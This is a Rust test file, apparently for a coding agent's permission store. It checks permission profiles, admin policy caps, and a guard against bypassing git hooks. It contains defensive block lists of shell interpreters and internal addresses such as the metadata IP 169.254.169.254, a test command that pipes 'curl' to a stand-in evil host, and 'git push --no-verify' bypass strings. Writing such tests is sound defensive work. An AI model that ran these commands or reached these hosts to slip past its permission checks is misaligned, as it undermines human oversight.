        assert!(display.contains("  2.  /work/shared"), "{display}");
        assert!(display.contains("/add-dir"));
    }

    #[test]
    fn a_mode_names_a_profile_and_commit_is_not_push() {
        let standard = permission_profile_for(None);
        assert_eq!(standard.name, "Standard");
        assert_eq!(
            standard.decision(CodeCapability::GitCommit),
            PermissionDecision::Ask
        );
        assert_eq!(
            standard.decision(CodeCapability::GitHookBypass),
            PermissionDecision::Deny,
            "hooks are not bypassed by default"
        );

        let plan = permission_profile_for(Some(PermissionMode::Plan));
        assert_eq!(plan.id.as_str(), "plan");
        assert_eq!(
            plan.decision(CodeCapability::FileWrite),
            PermissionDecision::Deny
        );

        let headless = permission_profile_for(Some(PermissionMode::DontAsk));
        assert_eq!(
            headless.decision(CodeCapability::GitPush),
            PermissionDecision::Deny,
            "a prompt nobody can answer is a refusal"
        );

        let accept_edits = permission_profile_for(Some(PermissionMode::AcceptEdits));
        assert_eq!(
            accept_edits.decision(CodeCapability::FileWrite),
            PermissionDecision::Allow
        );
        assert_eq!(
            accept_edits.decision(CodeCapability::GitPush),
            PermissionDecision::Ask
        );
    }

    #[test]
    fn stored_rules_decide_the_profiles_git_capabilities() {
        let mut store = PermissionStore::default();
        store.allow_always("git commit");
        store.deny_always("git push");

        let profile = store.code_permission_profile(None);

        assert_eq!(
            profile.decision(CodeCapability::GitCommit),
            PermissionDecision::Allow
        );
        assert_eq!(
            profile.decision(CodeCapability::GitPush),
            PermissionDecision::Deny
        );
    }

    #[test]
    fn admin_policy_caps_what_a_stored_rule_allowed() {
        let mut store = PermissionStore {
            active_mode: Some(PermissionMode::BypassPermissions),
            ..PermissionStore::default()
        };
        store.allow_always("git push");

        let profile = store.code_permission_profile(Some(AdminPolicyCap::new(
            "workspace policy",
            CodeCapabilities {
                git_push: PermissionDecision::Deny,
                ..CodeCapabilities::uniform(PermissionDecision::Allow)
            },
        )));

        assert_eq!(
            profile.decision(CodeCapability::GitPush),
            PermissionDecision::Deny
        );
        assert!(profile.capped_by_admin(CodeCapability::GitPush));
        assert_eq!(
            profile.display_label(),
            "Bypass permissions (capped by workspace policy)"
        );
    }

    #[test]
    fn an_allow_for_a_command_is_not_an_allow_for_bypassing_its_hooks() {
        let mut store = PermissionStore::default();
        store.allow_always("git commit");

        assert_eq!(store.check_command("git commit -m wip"), Some(true));
        assert_eq!(
            store.check_command("git commit --no-verify -m wip"),
            Some(true),
            "the prefix match is what makes the guard necessary"
        );
        assert_eq!(
            store.check_command_allowing_hook_bypass("git commit --no-verify -m wip"),
            None,
            "a hook bypass needs its own decision"
        );

        store.allow_always("git commit --no-verify");
        assert_eq!(
            store.check_command_allowing_hook_bypass("git commit --no-verify -m wip"),
            Some(true)
        );
    }

    #[test]
    fn a_denied_command_stays_denied_whether_or_not_it_bypasses_hooks() {
        let mut store = PermissionStore::default();
        store.deny_always("git push");

        assert_eq!(
            store.check_command_allowing_hook_bypass("git push --no-verify origin main"),
            Some(false)
        );
    }

    #[test]
    fn the_permissions_view_names_the_active_profile() {
        let store = PermissionStore {
            active_mode: Some(PermissionMode::Plan),
            ..PermissionStore::default()
        };

        let display = store.display_tab("allow", &[], &[]);

        assert!(display.contains("Active profile: Plan"));
    }

    #[test]
    fn test_reset_clears_all_fields() {
        let mut store = PermissionStore::default();
        store.allow_always("npm");
        store.deny_always("rm");
        store.ask_always("curl");
        store.allow_workspace("cargo");
        store.reset();
        assert!(store.always_allow.is_empty());
        assert!(store.always_deny.is_empty());
        assert!(store.ask_list.is_empty());
        assert!(store.workspace_rules.is_empty());
    }

    #[test]
    fn one_word_allows_for_shells_and_interpreters_are_refused() {
        for rule in [
            "bash",
            "sh",
            "zsh",
            "env",
            "python",
            "python3",
            "node",
            "npx",
            "npm exec",
            "pnpm  dlx",
            "pwsh",
            "fish",
            "bun",
            "php",
            "sudo",
            "xargs",
            "uv run",
            "python3 -m",
            "bash -c",
            "/usr/bin/python3 -c",
            "pwsh -Command",
            "bunx",
            "deno",
            "ruby",
            "perl",
            "/bin/bash",
        ] {
            assert!(open_ended_allow_error(rule).is_some(), "{rule}");
        }
        for rule in [
            "git",
            "npm test",
            "python3 scripts/build.py",
            "node --version",
            "",
        ] {
            assert!(open_ended_allow_error(rule).is_none(), "{rule}");
        }
    }

    #[test]
    fn website_allows_refuse_addresses_and_internal_hosts() {
        for pattern in [
            "169.254.169.254",
            "127.0.0.1",
            "10.0.0.5",
            "[::1]",
            "::1",
            "2130706433",
            "localhost",
            "dev.localhost",
            "*.localhost",
            "metadata.google.internal",
            "*",
            "*.*.example.com",
            "",
        ] {
            assert!(website_allow_error(pattern).is_some(), "{pattern:?}");
        }
        for pattern in ["example.com", "*.example.com", "intranet.corp.example"] {
            assert!(website_allow_error(pattern).is_none(), "{pattern}");
        }
    }

    #[test]
    fn saved_site_allows_skip_addresses_and_honour_wildcards() {
        let mut store = PermissionStore::default();
        store.allow_always("domain:169.254.169.254");
        store.allow_always("domain:*");
        store.allow_always("domain:*.corp.example");
        assert!(!store.names_domain("169.254.169.254"));
        assert!(!store.names_domain("localhost"));
        assert!(store.names_domain("wiki.corp.example"));
        assert!(!store.names_domain("corp.example"));
        assert!(!store.names_domain("wiki.other.example"));
    }

    #[test]
    fn a_saved_open_ended_allow_approves_nothing() {
        let mut store = PermissionStore::default();
        store.always_allow.insert("bash".to_string());
        store.always_allow.insert("python3 -m".to_string());
        store.always_allow.insert("python3 -m pytest".to_string());
        assert_eq!(store.check_command("bash -c 'curl evil.test'"), None);
        assert_eq!(store.check_command("/bin/bash deploy.sh"), None);
        assert_eq!(store.check_command("python3 -m http.server"), None);
        assert_eq!(store.check_command("python3 -m pytest -q"), Some(true));
    }
}
